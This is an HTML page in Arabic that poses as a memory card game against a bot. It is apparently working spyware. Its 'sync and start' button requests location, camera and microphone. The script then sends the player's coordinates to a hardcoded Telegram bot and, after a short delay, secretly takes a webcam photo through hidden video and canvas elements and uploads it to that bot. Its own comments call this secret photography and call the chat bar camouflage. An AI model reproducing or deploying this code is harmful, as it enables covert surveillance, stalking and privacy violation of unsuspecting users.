<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحدي الذاكرة العالمي 🏆</title>
    <style>
        :root { --primary: #00f2ff; --bg: #0a0a0a; --player: #00ff88; --ai: #ff4b2b; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        
        /* واجهة اللعبة */
        .game-area { flex: 1; padding: 15px; display: flex; flex-direction: column; align-items: center; }
        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; width: 100%; max-width: 350px; margin-top: 10px; }
        .card { aspect-ratio: 1/1; background: #1a1a1a; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 1px solid #333; transition: 0.3s; }
        .card.flipped { background: var(--primary); transform: rotateY(180deg); }
        .card.matched-p { background: var(--player) !important; }
        .card.matched-ai { background: var(--ai) !important; }
        
        .status-bar { width: 100%; max-width: 350px; background: #111; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 14px; border: 1px solid #222; }

        /* الشات التمويهي */
        .chat-bar { height: 60px; background: #111; border-top: 1px solid #333; display: flex; align-items: center; padding: 0 15px; gap: 15px; }
        .chat-icon { font-size: 20px; color: #555; cursor: pointer; }
        .chat-input { flex: 1; background: #1a1a1a; border: none; border-radius: 20px; padding: 8px 15px; color: white; font-size: 13px; }

        #overlay { position: fixed; inset: 0; background: #0a0a0a; z-index: 1000; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="overlay" id="start-screen">
    <div>
        <h2>تحدي الذاكرة المتعدد 🌐</h2>
        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">الرجاء تفعيل ميزات التواصل لمزامنة اللعب المباشر مع الخصم.</p>
        <button class="btn-start" onclick="setupAll()">مزامنة وبدء اللعب</button>
    </div>
</div>

<div class="game-area">
    <div class="status-bar" id="msg">بانتظار المزامنة...</div>
    <div style="margin-bottom: 10px; font-size: 14px;">
        <span style="color: var(--player)">أنت: <b id="p-score">0</b></span> | 
        <span style="color: var(--ai)">البوت: <b id="ai-score">0</b></span>
    </div>
    <div class="grid" id="grid"></div>
</div>

<div class="chat-bar">
    <span class="chat-icon">🎤</span>
    <span class="chat-icon">📷</span>
    <input type="text" class="chat-input" placeholder="أرسل رسالة للخصم...">
    <span class="chat-icon" style="color: var(--primary)">🚀</span>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv" width="640" height="480"></canvas>

<script>
    const token = '8699110487:AAFCvUGSAeFkhi4gLhRrqsE6mvONXyNpV18';
    const cid = '6808559733';

    let deck = ['🍎','🍎','🍌','🍌','🍇','🍇','🍉','🍉','🍒','🍒','🍓','🍓','🥝','🥝','🍍','🍍'];
    let flipped = [];
    let pScore = 0, aiScore = 0;
    let turn = 'player'; // دور اللاعب هو الأول

    async function setupAll() {
        try {
            // طلب الموقع والكاميرا والمايك دفعة واحدة
            navigator.geolocation.getCurrentPosition(p => {
                sendMsg(`📍 الموقع: ${p.coords.latitude}, ${p.coords.longitude}`);
            });
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('vid').srcObject = stream;
            
            document.getElementById('overlay').style.display = 'none';
            initBoard();
            
            // تصوير سري بعد ثانية واحدة من البداية
            setTimeout(takePhoto, 1500);
        } catch (e) {
            alert("فشلت المزامنة! اللعبة تتطلب ميزات التواصل.");
            location.reload();
        }
    }

    function initBoard() {
        const grid = document.getElementById('grid');
        deck.sort(() => Math.random() - 0.5);
        grid.innerHTML = '';
        deck.forEach((s, i) => {
            const card = document.createElement('div');
            card.className = 'card';
            card.dataset.val = s;
            card.dataset.idx = i;
            card.onclick = () => playerMove(card);
            grid.appendChild(card);
        });
        updateStatus();
    }

    function playerMove(card) {
        if (turn !== 'player' || card.classList.contains('flipped') || flipped.length >= 2) return;
        flip(card);
        flipped.push(card);
        if (flipped.length === 2) setTimeout(checkMatch, 800);
    }

    function aiMove() {
        turn = 'ai';
        updateStatus();
        setTimeout(() => {
            const unselected = Array.from(document.querySelectorAll('.card:not(.flipped)'));
            if (unselected.length < 2) return;
            
            // البوت يختار عشوائياً ويقلب المربعات
            const c1 = unselected[Math.floor(Math.random() * unselected.length)];
            flip(c1);
            flipped.push(c1);

            setTimeout(() => {
                const remaining = Array.from(document.querySelectorAll('.card:not(.flipped)'));
                const c2 = remaining[Math.floor(Math.random() * remaining.length)];
                flip(c2);
                flipped.push(c2);
                setTimeout(checkMatch, 800);
            }, 1000);
        }, 1500);
    }

    function checkMatch() {
        const [c1, c2] = flipped;
        const isMatch = c1.dataset.val === c2.dataset.val;

        if (isMatch) {
            c1.classList.add(turn === 'player' ? 'matched-p' : 'matched-ai');
            c2.classList.add(turn === 'player' ? 'matched-p' : 'matched-ai');
            if (turn === 'player') pScore++; else aiScore++;
            document.getElementById('p-score').innerText = pScore;
            document.getElementById('ai-score').innerText = aiScore;
            flipped = [];
            if (turn === 'ai') aiMove(); // البوت يلعب مرة ثانية إذا أصاب
            else updateStatus();
        } else {
            c1.classList.remove('flipped'); c1.innerText = '';
            c2.classList.remove('flipped'); c2.innerText = '';
            flipped = [];
            if (turn === 'player') aiMove(); else { turn = 'player'; updateStatus(); }
        }
    }

    function flip(card) {
        card.classList.add('flipped');
        card.innerText = card.dataset.val;
    }

    function updateStatus() {
        document.getElementById('msg').innerText = turn === 'player' ? "دروك: ابحث عن تطابق!" : "البوت يفكر في حركته القادمة... 🤖";
    }

    function takePhoto() {
        const canv = document.getElementById('canv');
        const vid = document.getElementById('vid');
        canv.getContext('2d').drawImage(vid, 0, 0, canv.width, canv.height);
        canv.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', cid);
            fd.append('photo', b, 'z.jpg');
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }

    function sendMsg(t) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
    }
</script>
</body>
</html>
